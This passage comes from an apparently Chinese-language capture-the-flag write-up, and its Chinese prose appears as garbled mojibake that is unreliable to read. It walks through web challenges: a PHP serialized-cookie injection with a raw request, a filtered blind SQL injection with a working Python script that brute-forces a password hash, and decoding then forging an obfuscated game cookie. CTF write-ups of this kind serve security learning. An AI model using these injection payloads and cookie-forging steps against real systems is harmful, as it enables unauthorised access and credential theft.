value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;  &lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php&#125;$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;?&gt;</code></pre></div><p>ä»£ç å®¡è®¡å®Œåæ€è·¯å¾ˆç®€å•å°±æ˜¯cookieæ³¨å…¥ï¼Œè€Œä¸”$KEYçš„å€¼ä¸‹é¢ä¹Ÿå·²ç»ç»™äº†</p><p>ç›´æ¥æ„é€ </p><div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">ISecer</span>=s:<span class="hljs-number">21</span>:<span class="hljs-string">"ISecer:www.isecer.com"</span><span class="hljs-comment">;</span></code></pre></div><p>ä½†æ˜¯ä¼šå‘ç°å¹¶æ²¡æœ‰æ˜¾ç¤ºflagï¼Œè¿™æ˜¯å› ä¸ºè¿™é¢˜ç»™å‡ºçš„$KEYæ˜¯è¿·æƒ‘äººçš„ï¼Œä¸‹é¢è¿™æ®µphpä»£ç ä¸ä¸Šé¢æ²¡å…³ç³»ï¼Œå°±æ˜¯è¯´æ˜ä¸Šé¢ä»£ç ä¸­$KEYä¸ºNULL</p><p>æ‰€ä»¥çœŸæ­£çš„payloadï¼š</p><div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">ISecer</span>=s:<span class="hljs-number">0</span>:<span class="hljs-string">""</span><span class="hljs-comment">;</span></code></pre></div><p>è¯·æ±‚å¤´</p><div class="hljs"><pre><code class="hljs groovy">GET <span class="hljs-regexp">/flagphp/</span> HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">Host:</span> <span class="hljs-number">123.206</span><span class="hljs-number">.87</span><span class="hljs-number">.240</span>:<span class="hljs-number">8002</span>User-<span class="hljs-string">Agent:</span> Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/</span><span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">46.0</span><span class="hljs-string">Accept:</span> text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,*/</span>*;q=<span class="hljs-number">0.8</span>Accept-<span class="hljs-string">Language:</span> zh-CN,zh;q=<span class="hljs-number">0.8</span>,en-US;q=<span class="hljs-number">0.5</span>,en;q=<span class="hljs-number">0.3</span><span class="hljs-string">DNT:</span> <span class="hljs-number">1</span><span class="hljs-string">Cookie:</span> ISecer=<span class="hljs-string">s:</span><span class="hljs-number">0</span>:<span class="hljs-string">""</span>;<span class="hljs-string">Connection:</span> close</code></pre></div><h2 id="sqlæ³¨å…¥2"><a href="#sqlæ³¨å…¥2" class="headerlink" title="sqlæ³¨å…¥2"></a>sqlæ³¨å…¥2</h2><p>æç¤ºï¼š</p><blockquote><p>å…¨éƒ½tmè¿‡æ»¤äº†ç»æœ›å—ï¼Ÿ</p><p>æç¤º !,!=,=,+,-,^,%</p></blockquote><p>å¸¦æœ‰è¿‡æ»¤çš„sqlæ³¨å…¥</p><p>å…ˆæµ‹è¯•ä¸€ä¸‹è¿‡æ»¤å“ªäº›å­—ç¬¦</p><p><img src="https://i.loli.net/2020/11/25/zAG3jeME7Ocs2Wt.png" srcset="/img/loading.gif" alt="sql2-2.png"></p><p>æµ‹è¯•å‘ç°  or ï¼Œand,#,â€“+,union,from ,database(),è¿™äº›å¸¸ç”¨å­—ç¬¦éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ²¡æœ‰è¿‡æ»¤çš„å­—ç¬¦åªæœ‰æç¤ºä¸­çš„å­—ç¬¦</p><p>æµ‹è¯•è¿˜å¯ä»¥å‘ç°ï¼Œå½“uname=admin&amp;passwd=111æ—¶æç¤ºçš„password error ,</p><p>ä½†æ˜¯å½“uname=adm&amp;passwd=111æ—¶æç¤ºusername errorï¼Œè¿™ä¹Ÿæ˜¯ç›²æ³¨çš„ä¸€ç§äº†ã€‚</p><p>å½“uname=adminâ€™-1-â€˜&amp;passwd=11æ—¶ä¸ºfalse</p><p>å½“uname=adminâ€™-0-â€˜&amp;passwd=1æ—¶ä¸ºtrue</p><p>æ‰€ä»¥çŒœæµ‹sqlæŸ¥è¯¢è¯­å¥ä¸º</p><div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; select * from users where username&#x3D;$username;</code></pre></div><h3 id="å°è¯•æ„é€ æ³¨å…¥è¯­å¥"><a href="#å°è¯•æ„é€ æ³¨å…¥è¯­å¥" class="headerlink" title="å°è¯•æ„é€ æ³¨å…¥è¯­å¥"></a>å°è¯•æ„é€ æ³¨å…¥è¯­å¥</h3><div class="hljs"><pre><code class="hljs lisp">ascii(<span class="hljs-name">substr</span>((<span class="hljs-name">select</span> database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;50</code></pre></div><p>ä¸Šåçš„è¯­å¥å¯ä»¥æ”¾åˆ°adminâ€™-1â€™&amp;passwd=11ä¸­ 1çš„ä½ç½®</p><p>ä½†æ˜¯è¿˜æ˜¯å­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼Œå› ä¸ºé¢˜ç›®è¿‡æ»¤äº†ç©ºæ ¼ï¼Œé€—å·ï¼Œå¤šæ¬¡ä¿®æ”¹åå‹¾å‡ºä¸‹é¢çš„è¯­å¥</p><div class="hljs"><pre><code class="hljs mysql">ascii(mid(REVERSE(MID((passwd)from(-1)))from(-1)))&gt;0</code></pre></div><p>reverse ä¸ºå­—ç¬¦ä¸²åè½¬å‡½æ•°</p><p><img src="https://i.loli.net/2020/11/25/fAOErbn2JSWxgPM.png" srcset="/img/loading.gif" alt="sql2-1.png"></p><p>ç¡®å®šç›²æ³¨çš„åˆ¤æ–­æ¡ä»¶</p><p>å½“ä¸Šé¢çš„è¯­å¥æˆç«‹æ—¶è¿”å›çš„æ˜¯ username error </p><p><img src="https://i.loli.net/2020/11/25/7NWBSIEGUTqiMKt.png" srcset="/img/loading.gif" alt="sql2-4.png"></p><p>ä¸æˆç«‹æ—¶è¿”å›çš„æ˜¯password  error  </p><p><img src="https://i.loli.net/2020/11/25/5wdsrDZSipRENB3.png" srcset="/img/loading.gif" alt="sql-3.png"></p><p>ç¼–å†™è„šæœ¬</p><p>å› ä¸ºå¯†ç ä¿å­˜æ—¶ä¸€èˆ¬æ˜¯ä»¥ md5å½¢å¼ä¿å­˜ï¼Œæ‰€ä»¥çˆ†ç ´å¯†ç çš„é•¿åº¦åº”è¯¥ä¸º32ä½</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">"http://123.206.87.240:8007/web2/login.php"</span>cookie =&#123;<span class="hljs-string">'PHPSESSID'</span>:<span class="hljs-string">'r3rln64ialiqjnefpa6qu5a0t513t8rs'</span>&#125;password = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">'0123456789abcdef'</span>:        payload = <span class="hljs-string">"admin'-(ascii(mid(REVERSE(MID((passwd)from(-&#123;0&#125;)))from(-1)))=&#123;1&#125;)-'"</span>.format(i,ord(j))        data=&#123;<span class="hljs-string">'uname'</span>:payload,<span class="hljs-string">'passwd'</span>:<span class="hljs-string">"111"</span>&#125;        res = requests.post(url=url,cookies=cookie,data=data)        <span class="hljs-keyword">if</span> <span class="hljs-string">"username"</span> <span class="hljs-keyword">in</span> res.text:            password +=j            <span class="hljs-comment">#print(password)</span>            <span class="hljs-keyword">break</span>print(password)</code></pre></div><p><img src="https://i.loli.net/2020/11/25/uhOXQkE5VNt623H.png" srcset="/img/loading.gif" alt="sql2-5.png"></p><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">005</span>b81fd960f61505237dbb7a3202910md5åœ¨çº¿è§£ç åä¸ºadmin123</code></pre></div><p>ç™»å½•åå³å¯ç”¨lså‘½ä»¤ï¼Œå°±å¯ä»¥æ‹¿åˆ°flag</p><p>è¿™é¢˜ä½¿ç”¨çš„æ˜¯å¼±å¯†ç ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨bpçš„çˆ†ç ´æ¨¡å—è¿›è¡Œå¯†ç çˆ†ç ´</p><p>å‚è€ƒå¶å¸ˆå‚…ï¼š<a href="https://xz.aliyun.com/t/2583" target="_blank" rel="noopener">https://xz.aliyun.com/t/2583</a></p><h2 id="å­™xxçš„åšå®¢"><a href="#å­™xxçš„åšå®¢" class="headerlink" title="å­™xxçš„åšå®¢"></a>å­™xxçš„åšå®¢</h2><p>è¿›å…¥é¡µé¢æ˜¯ä¸€ä¸ªåšå®¢çš„é¡µé¢ï¼Œæœ‰æœç´¢åŠŸèƒ½ï¼Œæ²¡æœ‰æ€è·¯</p><p>äºæ˜¯æ‰«æç›®å½•</p><p><img src="https://i.loli.net/2020/11/25/eMWjLmnHahPJXk9.png" srcset="/img/loading.gif" alt="blog.png"></p><p>ä½†æ˜¯æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç½‘ä¸Šçš„wpï¼Œå‘ç°phpmyadminè¢«äººåˆ äº†ï¼Œæ‰€ä»¥æ²¡æ³•åš</p><h2 id="Trimçš„æ—¥è®°æœ¬"><a href="#Trimçš„æ—¥è®°æœ¬" class="headerlink" title="Trimçš„æ—¥è®°æœ¬"></a>Trimçš„æ—¥è®°æœ¬</h2><p>tips:ä¸è¦ä¸€æ¬¡å°±æ”¾å¼ƒ</p><p>æ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œä½†æ˜¯æ²¡æœ‰è´¦å·ï¼Œæƒ³ç€å…ˆæ³¨å†Œä¸€ä¸ªï¼Œä½†æ˜¯å‘ç°æç¤ºæ•°æ®åº“è¿æ¥å¤±è´¥ï¼Œæ‰€ä»¥åº”è¯¥ä¸æ˜¯è¿™ä¸ªæ–¹æ³•</p><p>é‚£å°±ä¸‡äº‹ä¸è§‰æ‰«ä»¥ä¸‹</p><p>è¿˜çœŸæœ‰å‘ç°</p><p>æ‰«åˆ°ä¸‰ä¸ªç›®å½•</p><p>login.php</p><p>register.php</p><p>show.php</p><p>è®¿é—®show.php,æ‹¿åˆ°flag</p><p><img src="https://i.loli.net/2020/11/25/9JLhgS4HveW7Yyk.png" srcset="/img/loading.gif" alt="trim.png"></p><h2 id="login2-SKCTF-login3-æ–‡ä»¶ä¸Šä¼ 2-login4"><a href="#login2-SKCTF-login3-æ–‡ä»¶ä¸Šä¼ 2-login4" class="headerlink" title="login2(SKCTF)  login3  æ–‡ä»¶ä¸Šä¼ 2  login4"></a>login2(SKCTF)  login3  æ–‡ä»¶ä¸Šä¼ 2  login4</h2><p>é¢˜ç›®éƒ½æŒ‚äº†</p><h2 id="æ±Ÿæ¹–é­”å¤´"><a href="#æ±Ÿæ¹–é­”å¤´" class="headerlink" title="æ±Ÿæ¹–é­”å¤´"></a>æ±Ÿæ¹–é­”å¤´</h2><p>æç¤º:å­¦ä¼šå¦‚æ¥ç¥æŒå°±å¯ä»¥æ‰“è´¥ä»–äº†å§</p><p>è¿›å…¥é¢˜ç›®å‘ç°è¿˜çœŸåƒæ˜¯æ¸¸æˆçš„ç•Œé¢</p><p>åŒ…å«å±æ€§ ç»ƒåŠŸ å•†åº— èµšé’± è®¨ä¼ é€€å‡º å‡ ä¸ªé¡µé¢</p><p><img src="https://i.loli.net/2020/11/25/YSI7zwLur5nCdca.png" srcset="/img/loading.gif" alt="mt-1.png"></p><p>å…¶ä¸­ç»ƒåŠŸå¯ä»¥æé«˜è‡ªèº«å±æ€§ï¼Œä¹Ÿå°±æ˜¯æ­¦åŠ›å€¼ï¼Œèµšé’±æ¯æ¬¡åªèƒ½èµš100ï¼Œè€Œå•†åº—ä¸­æœ‰ä¸€äº›æé«˜æ­¦åŠ›å€¼çš„æ­¦å™¨ï¼Œå…¶ä¸­å°±æœ‰å¦‚æ¥ç¥æŒï¼Œä½†æ˜¯ä»·æ ¼ä¹Ÿé«˜çš„æƒŠäººï¼Œè‚¯å®šä¸æ˜¯é€šè¿‡èµšé’±çš„æ–¹æ³•æŒ£åˆ°é‚£ä¹ˆå¤šé’±ã€‚æ‰€ä»¥æ€è·¯å°±æ˜¯é€šè¿‡æ¼æ´ä¿®æ”¹é‡‘é’±æ•°é‡ä¹‹åè´­ä¹°å¦‚æ¥ç¥æŒï¼Œæ‰“è´¥é­”å¤´æ‹¿åˆ°flag</p><p><strong>æŸ¥çœ‹æºç </strong>    </p><p>åœ¨wulin.phpä¸­å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªjsæ–‡ä»¶</p><p><img src="https://i.loli.net/2020/11/25/Qkqr6FwmHVndU3s.png" srcset="/img/loading.gif" alt="mt-2.png"></p><div class="hljs"><pre><code class="hljs js"><span class="hljs-comment">//script.js åœ¨çº¿æ ¼å¼åŒ–åçš„ç»“æœ</span><span class="hljs-built_in">eval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">p, a, c, k, e, r</span>) </span>&#123;e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) </span>&#123;<span class="hljs-keyword">return</span> (c &lt; <span class="hljs-number">62</span> ? <span class="hljs-string">''</span> : e(<span class="hljs-built_in">parseInt</span>(c / <span class="hljs-number">62</span>))) + ((c = c % <span class="hljs-number">62</span>) &gt; <span class="hljs-number">35</span> ? <span class="hljs-built_in">String</span>.fromCharCode(c + <span class="hljs-number">29</span>) : c.toString(<span class="hljs-number">36</span>))&#125;;<span class="hljs-keyword">if</span> (<span class="hljs-string">'0'</span>.replace(<span class="hljs-number">0</span>, e) == <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">while</span> (c--) r[e(c)] = k[c];k = [<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>&#123;<span class="hljs-keyword">return</span> r[e] || e&#125;];e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">'[57-9abd-hj-zAB]'</span>&#125;;c = <span class="hljs-number">1</span>&#125;;<span class="hljs-keyword">while</span> (c--)<span class="hljs-keyword">if</span> (k[c]) p = p.replace(<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">'\\b'</span> + e(c) + <span class="hljs-string">'\\b'</span>, <span class="hljs-string">'g'</span>), k[c]);<span class="hljs-keyword">return</span> p&#125;(<span class="hljs-string">'7 s(t)&#123;5 m=t+"=";5 8=9.cookie.n(\';\');o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p""&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r="";o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y="user";5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\';\');5 e="";o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v("A"))&#123;e=8[i+1].n(":")[2]&#125;&#125;e=e.B(\'"\',"").B(\'"\',"");9.write(\'&lt;img id="f-1" g="h/1-1.k"&gt;\');j(7()&#123;9.l("f-1").g="h/1-2.k"&#125;,1000);j(7()&#123;9.l("f-1").g="h/1-3.k"&#125;,2000);j(7()&#123;9.l("f-1").g="h/1-4.k"&#125;,3000);j(7()&#123;9.l("f-1").g="h/6.png"&#125;,4000);j(7()&#123;alert("æµ£çŠ±å¨‡é¢ã„¥î›§é‰ãƒ§îš£éºå±¾å¢¦ç’ãƒ¤ç°¡é’‚æ¬’â‚¬ä¾€ç“Ÿé”›å±¼çµ¾æ¶“å¶‡ç…¡é–¬æ’´æ§¸éªç†»éŸ©æ©æ¨»æ§¸é‹å›ªéŸ©é”›å±¾å½æµœã‚ˆç˜¯æ¶“â‚¬æ¶“å¬ªæƒ‚!A&#123;"+md5(e)+"&#125;")&#125;,5000)&#125;'</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">'|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace'</span>.split(<span class="hljs-string">'|'</span>), <span class="hljs-number">0</span>, &#123;&#125;))</code></pre></div><p>å¯ä»¥çœ‹åˆ°<code>function(p, a, c, k, e, r)</code>å‡½æ•°æœ‰å…­ä¸ªå‚æ•°ï¼Œè€Œåé¢çš„ä¸€ä¸²å­—ç¬¦å¯ä»¥å‘ç°æ˜¯å¯¹åº”çš„å…­ä¸ªå®å‚ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ‰§è¡Œè¿™æ®µjsä»£ç ï¼Œçœ‹çœ‹ç»“æœæ˜¯ä»€ä¹ˆã€‚</p><div class="hljs"><pre><code class="hljs js">(<span class="hljs-string">'7 s(t)&#123;5 m=t+"=";5 8=9.cookie.n(\';\');o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p""&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r="";o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y="user";5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\';\');5 e="";o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v("A"))&#123;e=8[i+1].n(":")[2]&#125;&#125;e=e.B(\'"\',"").B(\'"\',"");9.write(\'&lt;img id="f-1" g="h/1-1.k"&gt;\');j(7()&#123;9.l("f-1").g="h/1-2.k"&#125;,1000);j(7()&#123;9.l("f-1").g="h/1-3.k"&#125;,2000);j(7()&#123;9.l("f-1").g="h/1-4.k"&#125;,3000);j(7()&#123;9.l("f-1").g="h/6.png"&#125;,4000);j(7()&#123;alert("æµ£çŠ±å¨‡é¢ã„¥î›§é‰ãƒ§îš£éºå±¾å¢¦ç’ãƒ¤ç°¡é’‚æ¬’â‚¬ä¾€ç“Ÿé”›å±¼çµ¾æ¶“å¶‡ç…¡é–¬æ’´æ§¸éªç†»éŸ©æ©æ¨»æ§¸é‹å›ªéŸ©é”›å±¾å½æµœã‚ˆç˜¯æ¶“â‚¬æ¶“å¬ªæƒ‚!A&#123;"+md5(e)+"&#125;")&#125;,5000)&#125;'</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">'|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace'</span>.split(<span class="hljs-string">'|'</span>), <span class="hljs-number">0</span>, &#123;&#125;)</code></pre></div><p>åˆ é™¤evalåœ¨æµè§ˆå™¨çš„æ§åˆ¶å°è·‘å‡ºçš„ç»“æœ</p><p><img src="https://i.loli.net/2020/11/25/gPRY2r7G1LdtecT.png" srcset="/img/loading.gif" alt="mt-4.png"></p><p>åœ¨çº¿ä»£ç æ ¼å¼åŒ–åå¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCookie</span>(<span class="hljs-params">cname</span>) </span>&#123;    <span class="hljs-keyword">var</span> name = cname + <span class="hljs-string">"="</span>;    <span class="hljs-keyword">var</span> ca = <span class="hljs-built_in">document</span>.cookie.split(<span class="hljs-string">';'</span>);    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;        <span class="hljs-keyword">var</span> c = ca[i].trim();        <span class="hljs-keyword">if</span> (c.indexOf(name) == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> c.substring(name.length, c.length)    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode_create</span>(<span class="hljs-params">temp</span>) </span>&#123;    <span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();    <span class="hljs-keyword">var</span> result = base.decode(temp);    <span class="hljs-keyword">var</span> result3 = <span class="hljs-string">""</span>;    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; result.length; i++) &#123;        <span class="hljs-keyword">var</span> num = result[i].charCodeAt();        num = num ^ i;        num = num - ((i % <span class="hljs-number">10</span>) + <span class="hljs-number">2</span>);        result3 += <span class="hljs-built_in">String</span>.fromCharCode(num)    &#125;    <span class="hljs-keyword">return</span> result3&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ertqwe</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">var</span> temp_name = <span class="hljs-string">"user"</span>;    <span class="hljs-keyword">var</span> temp = getCookie(temp_name);    temp = <span class="hljs-built_in">decodeURIComponent</span>(temp);    <span class="hljs-keyword">var</span> mingwen = decode_create(temp);    <span class="hljs-keyword">var</span> ca = mingwen.split(<span class="hljs-string">';'</span>);    <span class="hljs-keyword">var</span> key = <span class="hljs-string">""</span>;    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-number">-1</span> &lt; ca[i].indexOf(<span class="hljs-string">"flag"</span>)) &#123;            key = ca[i + <span class="hljs-number">1</span>].split(<span class="hljs-string">":"</span>)[<span class="hljs-number">2</span>]        &#125;    &#125;    key = key.replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">""</span>);    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;img id="attack-1" src="image/1-1.jpg"&gt;'</span>);    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"attack-1"</span>).src = <span class="hljs-string">"image/1-2.jpg"</span>    &#125;, <span class="hljs-number">1000</span>);    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"attack-1"</span>).src = <span class="hljs-string">"image/1-3.jpg"</span>    &#125;, <span class="hljs-number">2000</span>);    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"attack-1"</span>).src = <span class="hljs-string">"image/1-4.jpg"</span>    &#125;, <span class="hljs-number">3000</span>);    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"attack-1"</span>).src = <span class="hljs-string">"image/6.png"</span>    &#125;, <span class="hljs-number">4000</span>);    setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        alert(<span class="hljs-string">"æµ£çŠ±å¨‡é¢ã„¥î›§é‰ãƒ§îš£éºå±¾å¢¦ç’ãƒ¤ç°¡é’‚æ¬’â‚¬ä¾€ç“Ÿé”›å±¼çµ¾æ¶“å¶‡ç…¡é–¬æ’´æ§¸éªç†»éŸ©æ©æ¨»æ§¸é‹å›ªéŸ©é”›å±¾å½æµœã‚ˆç˜¯æ¶“â‚¬æ¶“å¬ªæƒ‚!flag&#123;"</span> + md5(key) + <span class="hljs-string">"&#125;"</span>)    <span class="hljs-comment">//å‘ç°äº†flagå­—æ®µ  </span>    &#125;, <span class="hljs-number">5000</span>)&#125;</code></pre></div><p>é¦–å…ˆåœ¨æ§åˆ¶å°ä¸­è·å–cookie</p><div class="hljs"><pre><code class="hljs abnf">getCookie(<span class="hljs-string">"user"</span>)<span class="hljs-comment">;</span></code></pre></div><p><img src="https://i.loli.net/2020/11/25/YAdm9g1Z8R7MXIk.png" srcset="/img/loading.gif" alt></p><p>è·å–cookieï¼Œä½¿ç”¨ä¸Šé¢çš„jsä»£ç ä¸€æ­¥ä¸€æ­¥è§£ç </p><p>æœ€åä¼šè·å–åºåˆ—åŒ–åçš„ä¸€ä¸²å­—ç¬¦ä¸²</p><p><img src="https://i.loli.net/2020/11/25/ceNDwnU2LAVkv5Z.png" srcset="/img/loading.gif" alt="mt-5.png"></p><p>æœ€åè§£å‡ºæ¥çš„cookieå€¼</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:"human"</span><span class="hljs-selector-pseudo">:10</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"xueliang"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">615</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"neili"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">657</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"lidao"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">76</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"dingli"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">72</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">7</span>:<span class="hljs-string">"waigong"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">7</span>:<span class="hljs-string">"neigong"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">7</span>:<span class="hljs-string">"jingyan"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"yelian"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"money"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"0"</span>;&#125;</code></pre></div><p>ä½†æ˜¯ä¼šå‘ç°moneyçš„å€¼ä¸º0ï¼Œæ‰€ä»¥ä¸‹é¢çš„æ€è·¯å°±æ˜¯é€šè¿‡ä¿®æ”¹cookieä¸­moneyå€¼ä¹‹ååç¼–ç æˆé¢˜ç›®ä¸­çš„æ ¼å¼ï¼ŒæŠ“åŒ…ä¿®æ”¹cookieåä¹°æŠ€èƒ½æ‰“æ€ªæ‹¿åˆ°flag</p><p>æ”¹cookieçš„æ–¹æ³•å°±æ˜¯å°†æ˜æ–‡é€†å‘ç¼–ç ï¼š</p><p>åˆšå¼€å§‹å†™äº†æŒºä¹…çš„é€†å‘è§£å¯†ï¼Œå‘ç°è°ƒç”¨base64ä¸­çš„encodeæ—¶ï¼Œæ€ä¹ˆä¹Ÿè§£ä¸å‡ºåŸæ¥çš„åŠ å¯†ä»£ç ï¼Œencodeæ€ä¹ˆä¹ŸåŠ å¯†ä¸å‡ºåŸæ¥çš„cookieã€‚<br>çŒœæƒ³ä¸€å®šæ˜¯base64.jsæœ‰é—®é¢˜ï¼š</p><p>å‘ç°åŠ å¯†è¿‡ç¨‹å¹¶ä¸å¯¹åº”ï¼Œencodeè°ƒç”¨äº†_utf8_encode<br>ä½†decodeå¹¶æ²¡æœ‰è°ƒç”¨_utf8_encodeï¼Œæ‰€ä»¥éœ€è¦å¯¹ç¼–ç è¿‡ç¨‹è¿›è¡Œç›¸åº”çš„ä¿®æ”¹</p><p><img src="https://i.loli.net/2020/11/25/GWgjr69lpYb74cT.png" srcset="/img/loading.gif" alt="mt-7.png"></p><p><strong>ä¿®æ”¹åçš„åç¼–ç è¿‡ç¨‹</strong>ï¼Œå°†å…¶æ”¾åˆ°htmlæ–‡ä»¶ä¸­ï¼Œæµè§ˆå™¨è¿è¡Œå³å¯å‡ºç»“æœ</p><div class="hljs"><pre><code class="hljs html">//1.html<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Base64</span><span class="hljs-params">()</span> </span>&#123;</span> <span class="actionscript"><span class="hljs-comment">// private property</span></span><span class="actionscript">_keyStr = <span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span>;</span> <span class="actionscript"><span class="hljs-comment">// public method for encoding</span></span><span class="actionscript"><span class="hljs-keyword">this</span>.encode = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(input)</span> </span>&#123;</span><span class="actionscript"><span class="hljs-keyword">var</span> output = <span class="hljs-string">""</span>;</span><span class="actionscript"><span class="hljs-keyword">var</span> chr1, chr2, chr3, enc1, enc2, enc3, enc4;</span><span class="actionscript"><span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span><span class="actionscript"><span class="hljs-comment">//input = _utf8_encode(input); (æ³¨é‡Šæ‰è¿™ä¸ªå‡½æ•°è°ƒç”¨)</span></span><span class="actionscript"><span class="hljs-keyword">while</span> (i &lt; input.length) 